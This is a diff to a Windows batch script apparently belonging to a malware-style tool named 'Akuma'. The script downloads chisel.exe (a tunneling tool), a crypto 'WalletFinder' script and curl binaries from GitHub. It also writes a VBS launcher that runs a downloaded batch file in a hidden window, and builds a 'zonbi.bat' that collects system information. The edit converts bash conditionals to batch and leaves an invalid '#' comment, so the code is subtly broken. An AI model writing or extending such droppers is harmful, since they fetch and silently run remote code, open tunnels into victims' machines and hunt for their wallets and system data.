@@ -11,13 +11,15 @@ curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %homedriv
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/curl.exe > %homedrive%\Akuma\curl.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcurl.dll > %homedrive%\Akuma\libcurl.dll
 curl -L https://raw.githubusercontent.com/l-urk/Wallet-Finder/main/WalletFinder.bat > %homedrive%\Akuma\WalletFinder.bat
-if command -v curl &>/dev/null; then
+where curl >nul 2>nul
+if %errorlevel% == 0 (
 curl -L https://github.com/curl/curl/releases/download/curl-8_4_0/curl-8.4.0.zip > %homedrive%\Akuma\curl-8.4.0.zip
-tar -xf %homedrive%\Akuma\curl\curl-8.4.0.zip
+powershell Expand-Archive -Path '%homedrive%\Akuma\curl-8.4.0.zip' -DestinationPath '%homedrive%\Akuma'
 echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\curl.vbs
 echo objShell.Run "%homedrive%\Akuma\curl-8.4.0\buildconf.bat", 0, False >> %homedrive%\Akuma\curl.vbs
-else
-fi
+) else (
+# Pause the script to keep the window open
+)
 cd %homedrive%\Akuma
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
